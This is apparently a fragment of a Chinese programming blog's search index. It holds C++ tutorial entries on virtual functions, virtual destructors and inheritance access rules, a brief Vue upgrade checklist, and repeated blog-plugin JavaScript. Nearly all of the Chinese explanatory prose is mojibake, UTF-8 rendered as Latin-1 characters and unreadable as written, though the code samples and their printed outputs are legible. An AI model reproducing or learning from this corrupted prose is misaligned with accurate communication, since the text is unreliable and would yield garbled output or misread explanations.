åä¼šå‡ºç°æ„å¤–çš„ç°è±¡ï¼Œå³è¢«è°ƒç”¨çš„æ°¸è¿œæ˜¯çˆ¶ç±»çš„å‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // å­ç±»é‡å†™çˆ¶ç±»ä¸­çš„å‡½æ•° void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // æ‰§è¡Œçˆ¶ç±»çš„å‡½æ•° p = &amp;parent; p-&gt;print(); // æ‰§è¡Œçˆ¶ç±»çš„å‡½æ•° p = &amp;child; p-&gt;print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12I\'m parent, a = 6I\'m parent, a = 5 C/C++ æ˜¯é™æ€ç¼–è¯‘å‹è¯­è¨€ï¼Œåœ¨æ‰§è¡Œç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ ¹æ®æŒ‡é’ˆçš„ç±»å‹åˆ¤æ–­æŒ‡å‘çš„æ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„å¯¹è±¡ã€‚ä½†åœ¨ç¼–è¯‘ print() å‡½æ•°çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¸å¯èƒ½çŸ¥é“æŒ‡é’ˆ p ç©¶ç«ŸæŒ‡å‘äº†ä»€ä¹ˆå¯¹è±¡ï¼Œå› ä¸ºç¨‹åºè¿˜æ²¡æœ‰è¿è¡Œã€‚åŒæ—¶ç¼–è¯‘è¯‘å™¨æ²¡æœ‰ç†ç”±æŠ¥é”™ï¼Œäºæ˜¯ç¼–è¯‘å™¨è®¤ä¸ºæœ€å®‰å…¨çš„åšæ³•æ˜¯ç¼–è¯‘åˆ°çˆ¶ç±»çš„ print() å‡½æ•°ï¼Œå› ä¸ºçˆ¶ç±»å’Œå­ç±»è‚¯å®šéƒ½æœ‰ç›¸åŒçš„ print() å‡½æ•°ã€‚è¿™å°±æ˜¯æ‰€è°“çš„ é™æ€å¤šæ€ æˆ– é™æ€è”ç¼–ï¼Œå‡½æ•°è°ƒç”¨åœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰å°±å·²ç»å‡†å¤‡å¥½äº†ï¼›æœ‰æ—¶å€™è¿™ä¹Ÿè¢«ç§°ä¸º æ—©ç»‘å®šï¼Œå› ä¸º print() å‡½æ•°åœ¨ç¨‹åºç¼–è¯‘æœŸé—´å°±å·²ç»è®¾ç½®å¥½äº†ã€‚è¿™å°±å¼•å‡ºäº†é¢å‘å¯¹è±¡æ–°çš„éœ€æ±‚ï¼Œå¸Œæœ›æ ¹æ®å®é™…çš„å¯¹è±¡ç±»å‹æ¥åˆ¤æ–­é‡å†™å‡½æ•°çš„è°ƒç”¨ï¼›å¦‚æœçˆ¶ç±»æŒ‡é’ˆæŒ‡å‘çš„æ˜¯çˆ¶ç±»å¯¹è±¡åˆ™è°ƒç”¨çˆ¶ç±»ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œå¦‚æœçˆ¶ç±»æŒ‡é’ˆæŒ‡å‘çš„æ˜¯å­ç±»å¯¹è±¡åˆ™è°ƒç”¨å­ç±»ä¸­å®šä¹‰çš„é‡å†™å‡½æ•°ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ è™šå‡½æ•°çš„åº”ç”¨C++ ä¸­é€šè¿‡ virtual å…³é”®å­—å¯¹å¤šæ€è¿›è¡Œæ”¯æŒï¼Œä½¿ç”¨ virtual å…³é”®å­—å£°æ˜çš„å‡½æ•°è¢«é‡å†™åå³å¯å±•ç°å¤šæ€ç‰¹æ€§ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º è™šå‡½æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } // ä½¿ç”¨ "virtual" å…³é”®å­—å£°æ˜çˆ¶ç±»çš„å‡½æ•° virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int c) : Parent(c) { this-&gt;c = c; } // ä½¿ç”¨ "virtual" å…³é”®å­—å£°æ˜é‡å†™çˆ¶ç±»ä¸­çš„å‡½æ•° // åªè¦çˆ¶ç±»ä¸­çš„å‡½æ•°æœ‰ "virtual" å…³é”®å­—çš„å£°æ˜ï¼Œé‚£ä¹ˆå­ç±»çš„ "virtual" å£°æ˜å¯å†™å¯ä¸å†™ï¼Œä¸€èˆ¬å»ºè®®éƒ½å†™ä¸Š virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Parent* p = NULL; Parent parent(6); Child child(5); // æ‰§è¡Œçˆ¶ç±»çš„å‡½æ•° p = &amp;parent; p-&gt;print(); // æ‰§è¡Œå­ç±»çš„å‡½æ•° p = &amp;child; p-&gt;print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12I\'m parent, a = 6I\'m child, c = 5 æ­¤æ—¶ï¼Œç¼–è¯‘å™¨çœ‹çš„æ˜¯æŒ‡é’ˆçš„å†…å®¹ï¼Œè€Œä¸æ˜¯å®ƒçš„ç±»å‹ã€‚å› æ­¤ï¼Œç”±äº Parent å’Œ Child ç±»çš„å¯¹è±¡çš„åœ°å€å­˜å‚¨åœ¨ *p ä¸­ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨å„è‡ªçš„ print() å‡½æ•°ã€‚æ­£å¦‚æ‰€çœ‹åˆ°çš„ï¼Œçˆ¶ç±» Parent çš„æ¯ä¸ªå­ç±»éƒ½æœ‰ä¸€ä¸ª print() å‡½æ•°çš„ç‹¬ç«‹å®ç°ã€‚è¿™å°±æ˜¯å¤šæ€çš„ä¸€èˆ¬ä½¿ç”¨æ–¹å¼ï¼Œå³ä½¿ç”¨ä¸€ä¸ªçˆ¶ç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨å»è°ƒç”¨å­ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•ã€‚æœ‰äº†å¤šæ€å°±å¯ä»¥æœ‰å¤šä¸ªä¸åŒçš„å®ç°ç±»ï¼Œå®ƒä»¬éƒ½å¸¦æœ‰åŒä¸€ä¸ªåç§°ä½†å…·æœ‰ä¸åŒå®ç°çš„å‡½æ•°ï¼Œå‡½æ•°çš„å‚æ•°ç”šè‡³å¯ä»¥æ˜¯ç›¸åŒçš„ã€‚ è™šææ„å‡½æ•°è™šææ„å‡½æ•°çš„ä½œç”¨ï¼šä¸ºäº†é¿å…å†…å­˜æ³„æ¼ï¼Œé€šè¿‡çˆ¶ç±»çš„æŒ‡é’ˆï¼Œå¯ä»¥å°†æ‰€æœ‰å­ç±»å¯¹è±¡çš„ææ„å‡½æ•°éƒ½æ‰§è¡Œä¸€éï¼ˆé‡Šæ”¾æ‰€æœ‰çš„å­ç±»èµ„æºï¼‰ã€‚å³è™šææ„å‡½æ•°ä½¿å¾—åœ¨åˆ é™¤æŒ‡å‘å­ç±»å¯¹è±¡çš„çˆ¶ç±»æŒ‡é’ˆæ—¶ï¼Œå¯ä»¥è°ƒç”¨å­ç±»çš„ææ„å‡½æ•°æ¥å®ç°é‡Šæ”¾å­ç±»ä¸­å †å†…å­˜çš„ç›®çš„ï¼Œä»è€Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚ ææ„å‡½æ•°å¯ä»¥æ˜¯è™šçš„ï¼Œè™šææ„å‡½æ•°ç”¨äºæŒ‡å¼• delete è¿ç®—ç¬¦æ­£ç¡®ææ„åŠ¨æ€å¯¹è±¡ æ„é€ å‡½æ•°ä¸èƒ½æ˜¯è™šå‡½æ•°ï¼Œå› ä¸ºå»ºç«‹ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œå¿…é¡»ä»ç±»å±‚æ¬¡çš„æ ¹å¼€å§‹ï¼Œæ²¿ç€ç»§æ‰¿è·¯å¾„é€ä¸ªè°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•° è™šææ„å‡½æ•°çš„ç®€å•åº”ç”¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;using namespace std;class A {public: A() { this-&gt;p = new char[20]; strcpy(p, "Hello A"); cout &lt;&lt; "A ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } virtual ~A() { delete[] this-&gt;p; cout &lt;&lt; "A ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; }private: char* p;};class B : public A {public: B() { this-&gt;p = new char[20]; strcpy(p, "Hello B"); cout &lt;&lt; "B ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~B() { delete[] this-&gt;p; cout &lt;&lt; "B ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; }private: char* p;};int main() { // æ­¤å†™æ³•ï¼Œå¦‚æœä¸Šé¢ä¸ä½¿ç”¨ "virtual" ä¿®é¥°Aç±»ï¼ˆåŸºç±»ï¼‰çš„ææ„å‡½æ•°ï¼Œæ´¾ç”Ÿç±»ä¸æ‰€æœ‰åŸºç±»çš„ææ„å‡½æ•°ä¾ç„¶éƒ½ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ä¸€æ¬¡ B* b = new B(); delete b; cout &lt;&lt; endl; // æ­¤å†™æ³•ï¼Œå¦‚æœä¸Šé¢ä¸ä½¿ç”¨ "virtual" ä¿®é¥°Aç±»ï¼ˆåŸºç±»ï¼‰çš„ææ„å‡½æ•°ï¼Œé‚£ä¹ˆåªæœ‰Aç±»ï¼ˆåŸºç±»ï¼‰çš„ææ„å‡½æ•°ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼ŒBç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰çš„ææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼Œè¿™æ ·å°±ä¼šé€ æˆå†…å­˜æ³„æ¼ // è™šææ„å‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œé€šè¿‡çˆ¶ç±»çš„æŒ‡é’ˆï¼Œå¯ä»¥å°†æ‰€æœ‰å­ç±»å¯¹è±¡çš„ææ„å‡½æ•°éƒ½æ‰§è¡Œä¸€éï¼ˆé‡Šæ”¾æ‰€æœ‰çš„å­ç±»èµ„æºï¼‰ã€‚ A* a = new B(); delete a; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123456789A ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨B ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨B ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨A ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨A ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨B ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨B ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨A ç±»çš„ææ„å‡½æ•°è¢«è°ƒç”¨ è™šææ„å‡½æ•°çš„ä½œç”¨æ€»ç»“ a) å¦‚æœåŸºç±»çš„ææ„å‡½æ•°ä¸åŠ  virtual å…³é”®å­—ä¿®é¥°ï¼Œé‚£ä¹ˆå°±æ˜¯æ™®é€šææ„å‡½æ•° å½“åŸºç±»ä¸­çš„ææ„å‡½æ•°æ²¡æœ‰å£°æ˜ä¸ºè™šææ„å‡½æ•°æ—¶ï¼Œæ´¾ç”Ÿç±»å¼€å§‹ä»åŸºç±»ç»§æ‰¿ï¼ŒåŸºç±»çš„æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»çš„å¯¹è±¡æ—¶ï¼Œdelete åŸºç±»çš„æŒ‡é’ˆæ—¶ï¼Œåªä¼šè°ƒç”¨åŸºç±»çš„ææ„å‡½æ•°ï¼Œä¸ä¼šè°ƒç”¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•° b) å¦‚æœåŸºç±»çš„ææ„å‡½æ•°åŠ  virtual å…³é”®å­—ä¿®é¥°ï¼Œé‚£ä¹ˆå°±æ˜¯è™šææ„å‡½æ•° å½“åŸºç±»ä¸­çš„ææ„å‡½æ•°å£°æ˜ä¸ºè™šææ„å‡½æ•°æ—¶ï¼Œæ´¾ç”Ÿç±»å¼€å§‹ä»åŸºç±»ç»§æ‰¿ï¼ŒåŸºç±»çš„æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»çš„å¯¹è±¡æ—¶ï¼Œdelete åŸºç±»çš„æŒ‡é’ˆæ—¶ï¼Œå…ˆè°ƒç”¨æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°ï¼Œå†è°ƒç”¨åŸºç±»ä¸­çš„ææ„å‡½æ•° å¤šæ€çš„ç†è®ºåŸºç¡€ è”ç¼–ï¼šæ˜¯æŒ‡ä¸€ä¸ªç¨‹åºæ¨¡å—ã€ä»£ç ä¹‹é—´äº’ç›¸å…³è”çš„è¿‡ç¨‹ é™æ€è”ç¼–ï¼šæ˜¯ç¨‹åºçš„åŒ¹é…ã€è¿æ¥åœ¨ç¼–è¯‘é˜¶æ®µå®ç°ï¼Œä¹Ÿç§°ä¸ºæ—©æœŸè”ç¼–ï¼ˆæ—©ç»‘å®šï¼‰ å‡½æ•°é‡è½½å±äºé™æ€è”ç¼– åŠ¨æ€è”ç¼–ï¼šæ˜¯æŒ‡ç¨‹åºè”ç¼–æ¨è¿Ÿåˆ°è¿è¡Œæ—¶è¿›è¡Œï¼Œæ‰€ä»¥åˆç§°ä¸ºæ™šæœŸè”ç¼–ï¼ˆè¿Ÿç»‘å®šï¼‰ è™šå‡½æ•°ã€switch è¯­å¥å’Œ if è¯­å¥å±äºåŠ¨æ€è”ç¼– å¤šæ€ç†è®ºè”ç³»å®é™…åº”ç”¨ï¼ˆä»£ç ç¤ºä¾‹ï¼‰ï¼š C++ ä¸ C ç›¸åŒï¼Œæ˜¯é™æ€ç¼–è¯‘å‹è¯­è¨€ åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ ¹æ®æŒ‡é’ˆçš„ç±»å‹åˆ¤æ–­æŒ‡å‘çš„æ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„å¯¹è±¡ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨è®¤ä¸ºçˆ¶ç±»æŒ‡é’ˆæŒ‡å‘çš„æ˜¯çˆ¶ç±»å¯¹è±¡ ç”±äºç¨‹åºæ²¡æœ‰è¿è¡Œï¼Œæ‰€ä»¥ä¸å¯èƒ½çŸ¥é“çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘çš„å…·ä½“æ˜¯çˆ¶ç±»å¯¹è±¡è¿˜æ˜¯å­ç±»å¯¹è±¡ ä»ç¨‹åºå®‰å…¨çš„è§’åº¦ï¼Œç¼–è¯‘å™¨å‡è®¾çˆ¶ç±»æŒ‡é’ˆåªæŒ‡å‘çˆ¶ç±»å¯¹è±¡ï¼Œå› æ­¤ç¼–è¯‘çš„ç»“æœä¸ºè°ƒç”¨çˆ¶ç±»çš„æˆå‘˜å‡½æ•°ï¼Œè¿™ç§ç‰¹æ€§å°±æ˜¯ é™æ€è”ç¼– å¤šæ€æˆç«‹çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶ a) è¦æœ‰ç»§æ‰¿ b) è¦æœ‰è™šå‡½æ•°é‡å†™ c) çˆ¶ç±»æŒ‡é’ˆæˆ–å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ C++ 11 çš„ override å’Œ finaloverride å…³é”®å­—ï¼šç”¨æ¥æ£€æŸ¥å‡½æ•°æ˜¯å¦é‡å†™ï¼Œåœ¨å­ç±»ä¸­çš„å‡½æ•°å£°æ˜é‡ŒåŠ ä¸Šè¯¥å…³é”®å­— virtual void fun() override {}ï¼Œç¼–è¯‘å™¨å°±ä¼šè‡ªåŠ¨æ£€æŸ¥å¯¹åº”çš„å‡½æ•°æ˜¯å¦é‡å†™äº†çˆ¶ç±»ä¸­çš„å‡½æ•°final å…³é”®å­—ï¼šåœ¨ç±»çš„å£°æ˜ä¸­åŠ ä¸Šè¯¥å…³é”®å­— class A final {};ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¸è®©è¿™ä¸ªç±»è¢«ç»§æ‰¿ã€‚æˆ–è€…ï¼Œåœ¨ä¸€ä¸ªå‡½æ•°ååŠ ä¸Šè¯¥å…³é”®å­—ï¼Œè¡¨ç¤ºè¿™ä¸ªå‡½æ•°ä¸èƒ½è¢«é‡å†™ void fun() final {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Vue å¼€å‘éšç¬”",url:"/posts/d786f74a.html",text:'Vue ç‰ˆæœ¬å‡çº§è‹¥é¡¹ç›®éœ€è¦å‡çº§ Vue çš„ç‰ˆæœ¬ï¼Œä¸€èˆ¬ä¸»è¦æ˜¯å‡çº§ vue å’Œ vue-template-compiler ç»„ä»¶ï¼Œè€Œä¸”ä¸¤è€…çš„ç‰ˆæœ¬å·å¿…é¡»ä¸€è‡´ï¼Œå‡çº§æ­¥éª¤å¦‚ä¸‹ï¼š a) åˆ é™¤é¡¹ç›®é‡Œçš„ node_modules æ–‡ä»¶å¤¹ å’Œ package-lock.json æ–‡ä»¶ b) æ‰§è¡Œ npm view vue versions å‘½ä»¤æŸ¥çœ‹ Vue çš„æ‰€æœ‰ç‰ˆæœ¬å· c) æ›´æ”¹é¡¹ç›®é‡Œçš„ package.json æ–‡ä»¶ï¼Œä¸º vue å’Œ vue-template-compiler ç»„ä»¶æŒ‡å®šæ–°çš„ç‰ˆæœ¬å· d) åœ¨é¡¹ç›®é‡Œæ‰§è¡Œ npm install å‘½ä»¤ e) é‡æ–°ç¼–è¯‘æ„å»ºé¡¹ç›®ï¼Œè§‚å¯Ÿé¡¹ç›®ä»£ç æ˜¯å¦å¯ä»¥æ­£å¸¸ç¼–è¯‘ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘éšç¬” å‰ç«¯"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹ä¸ƒ",url:"/posts/e4826e2c.html",text:'ç»§æ‰¿æ¦‚å¿µé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡æœ‰ 4 ä¸ªä¸»è¦ç‰¹ç‚¹ï¼šæŠ½è±¡ã€å°è£…ã€ç»§æ‰¿å’Œå¤šæ€æ€§ã€‚é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„ä¸¤ä¸ªé‡è¦ç‰¹å¾ä¸€æ•°æ®æŠ½è±¡ä¸å°è£…ï¼Œä¸¤è€…å·²ç»èƒ½å¤Ÿè®¾è®¡å‡ºåŸºäºå¯¹è±¡çš„ç¨‹åºï¼Œè¿™æ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„åŸºç¡€ã€‚è¦è¾ƒå¥½åœ°è¿›è¡Œé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼Œè¿˜å¿…é¡»äº†è§£é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡å¦å¤–ä¸¤ä¸ªé‡è¦ç‰¹å¾ â€”â€” ç»§æ‰¿æ€§å’Œå¤šæ€æ€§ã€‚ç»§æ‰¿æ€§æ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡æœ€é‡è¦çš„ç‰¹å¾ï¼Œå¯ä»¥è¯´ï¼Œå¦‚æœæ²¡æœ‰æŒæ¡ç»§æ‰¿æ€§ï¼Œå°±ç­‰äºæ²¡æœ‰æŒæ¡ç±»å’Œå¯¹è±¡çš„ç²¾åï¼Œå°±æ˜¯æ²¡æœ‰æŒæ¡é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„çœŸè°›ã€‚ ç±»ä¹‹é—´çš„å…³ç³»ç±»ä¹‹é—´ä¸€èˆ¬æœ‰ä¸‰ç§å…³ç³»ï¼šhas-Aã€uses-A å’Œ is-Aï¼š has-Aï¼šåŒ…å«å…³ç³»ï¼Œç”¨ä»¥æè¿°ä¸€ä¸ªç±»ç”±å¤šä¸ª â€œéƒ¨ä»¶ç±»â€ æ„æˆã€‚å®ç° has-A å…³ç³»å¯ä»¥ç”¨ç±»æˆå‘˜è¡¨ç¤ºï¼Œå³ä¸€ä¸ªç±»ä¸­çš„æ•°æ®æˆå‘˜æ˜¯å¦ä¸€ç§å·²ç»å®šä¹‰çš„ç±»ã€‚ uses-Aï¼šä¸€ä¸ªç±»éƒ¨åˆ†åœ°ä½¿ç”¨å¦ä¸€ä¸ªç±»ã€‚ç±»ä¹‹é—´æˆå‘˜å‡½æ•°çš„è”ç³»ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰å‹å…ƒæˆ–è€…å¯¹è±¡å‚æ•°ä¼ é€’æ¥å®ç°ã€‚ is-Aï¼šæœºåˆ¶ç§°ä¸º â€œç»§æ‰¿â€ ã€‚å…³ç³»å…·æœ‰ä¼ é€’æ€§ï¼Œä¸å…·æœ‰å¯¹ç§°æ€§ã€‚ ç»§æ‰¿å…³ç³»ä¸¾ä¾‹ ç»§æ‰¿ç›¸å…³æ¦‚å¿µ æ´¾ç”Ÿç±»çš„å®šä¹‰ å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒC++ ä¸­çš„ç»§æ‰¿æ–¹å¼ï¼ˆpublicã€privateã€protectedï¼‰ä¼šå½±å“å­ç±»çš„å¯¹å¤–è®¿é—®å±æ€§ã€‚ ç»§æ‰¿é‡è¦è¯´æ˜ a) å­ç±»æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•° b) å­ç±»å¯ä»¥æ‹¥æœ‰çˆ¶ç±»æ²¡æœ‰çš„æ–¹æ³•å’Œå±æ€§ c) å­ç±»å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„çˆ¶ç±» d) å­ç±»å¯¹è±¡å¯ä»¥å½“ä½œçˆ¶ç±»å¯¹è±¡ä½¿ç”¨ ç»§æ‰¿ä½¿ç”¨æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;// å®šä¹‰çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰ï¼ˆçˆ¶ç±»ï¼‰class Parent {public: Parent(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } void print() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; endl; }public: int a; int b;};// å®šä¹‰æ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰class Child : public Parent {public: Child(int a = 0, int b = 0, int c = 0) { // ç›´æ¥è®¿é—®çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰ï¼ˆçˆ¶ç±»ï¼‰çš„æˆå‘˜å˜é‡ this-&gt;a = a; this-&gt;b = b; this-&gt;c = c; } void echo() { cout &lt;&lt; "a=" &lt;&lt; this-&gt;a &lt;&lt; ", b=" &lt;&lt; this-&gt;b &lt;&lt; ", c=" &lt;&lt; this-&gt;c &lt;&lt; endl; }private: int c;};int main() { Child child(1, 2, 3); child.print(); // ç›´æ¥è°ƒç”¨çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰ï¼ˆçˆ¶ç±»ï¼‰çš„æˆå‘˜å‡½æ•° child.echo(); // ç›´æ¥è°ƒç”¨æ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰çš„æˆå‘˜å‡½æ•° return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12a=1, b=2a=1, b=2, c=3 æ´¾ç”Ÿç±»çš„è®¿é—®æ§åˆ¶æ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰ç»§æ‰¿äº†åŸºç±»ï¼ˆçˆ¶ç±»ï¼‰çš„å…¨éƒ¨æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼ˆé™¤äº†æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ä¹‹å¤–çš„æˆå‘˜å‡½æ•°ï¼‰ï¼Œä½†æ˜¯è¿™äº›æˆå‘˜çš„è®¿é—®å±æ€§ï¼Œåœ¨æ´¾ç”Ÿè¿‡ç¨‹ä¸­æ˜¯å¯ä»¥è°ƒæ•´çš„ã€‚ å•ä¸ªç±»çš„è®¿é—®æ§åˆ¶åœ¨ C++ ä¸­ï¼Œç±»æˆå‘˜å˜é‡å’Œç±»æˆå‘˜å‡½æ•°çš„è®¿é—®çº§åˆ«ä¸º publicã€privateã€protected privateï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨è¢«è®¿é—® publicï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥åœ¨ç±»çš„å†…éƒ¨å’Œç±»çš„å¤–éƒ¨è¢«è®¿é—® protectedï¼šä¿®é¥°çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥åœ¨æ´¾ç”Ÿç±»çš„å†…éƒ¨è®¿é—®ï¼Œä¸èƒ½åœ¨æ´¾ç”Ÿç±»çš„å¤–éƒ¨è¢«è®¿é—® ç‰¹åˆ«æ³¨æ„ï¼šè‹¥åœ¨ç±»ä¸­æ²¡æœ‰å£°æ˜è®¿é—®æ§åˆ¶çº§åˆ«çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°ï¼Œé»˜è®¤éƒ½æ˜¯ private è®¿é—®çº§åˆ«çš„ ç»§æ‰¿æˆå‘˜çš„è®¿é—®æ§åˆ¶åœ¨ C++ ä¸­ï¼Œä¸åŒçš„ç»§æ‰¿æ–¹å¼ï¼ˆpublicã€privateã€protectedï¼‰ä¼šæ”¹å˜ç»§æ‰¿æˆå‘˜çš„è®¿é—®å±æ€§ï¼š public ç»§æ‰¿ï¼šçˆ¶ç±»æˆå‘˜åœ¨å­ç±»ä¸­ä¿æŒåŸæœ‰çš„è®¿é—®çº§åˆ« private ç»§æ‰¿ï¼šçˆ¶ç±»æˆå‘˜åœ¨å­ç±»ä¸­éƒ½å˜ä¸º private æˆå‘˜ protected ç»§æ‰¿ï¼šçˆ¶ç±»ä¸­ public æˆå‘˜ä¼šå˜æˆ protectedï¼Œçˆ¶ç±»ä¸­ private æˆå‘˜ä»ç„¶ä¸º privateï¼Œçˆ¶ç±»ä¸­ protected æˆå‘˜ä»ç„¶ä¸º protected ç‰¹åˆ«æ³¨æ„ï¼šprivate æˆå‘˜åœ¨å­ç±»ä¸­ä¾ç„¶å­˜åœ¨ï¼Œä½†æ˜¯æ— æ³•è®¿é—®åˆ°çš„ï¼Œå³ä¸è®ºä½¿ç”¨å“ªç§æ–¹å¼ç»§æ‰¿çˆ¶ç±»ï¼Œå­ç±»éƒ½ä¸èƒ½ç›´æ¥ä½¿ç”¨çˆ¶ç±»çš„ç§æœ‰æˆå‘˜ ç»§æ‰¿æˆå‘˜è®¿é—®æ§åˆ¶çš„ â€œä¸‰çœ‹â€ åŸåˆ™åœ¨ C++ ä¸­ï¼Œä¸åŒçš„ç»§æ‰¿æ–¹å¼ï¼ˆpublicã€privateã€protectedï¼‰ä¼šæ”¹å˜ç»§æ‰¿æˆå‘˜çš„è®¿é—®å±æ€§ï¼Œæœ€ç»ˆå¯æ€»ç»“ä¸ºä»¥ä¸‹ä¸‰ä¸ªåŸåˆ™ï¼ˆåˆ¤æ–­æŸä¸€å¥è¯ï¼Œæ˜¯å¦å¯ä»¥è¢«è®¿é—®ï¼‰ï¼š a) çœ‹è°ƒç”¨è¯­å¥æ˜¯å†™åœ¨å­ç±»çš„å†…éƒ¨è¿˜æ˜¯å¤–éƒ¨ b) 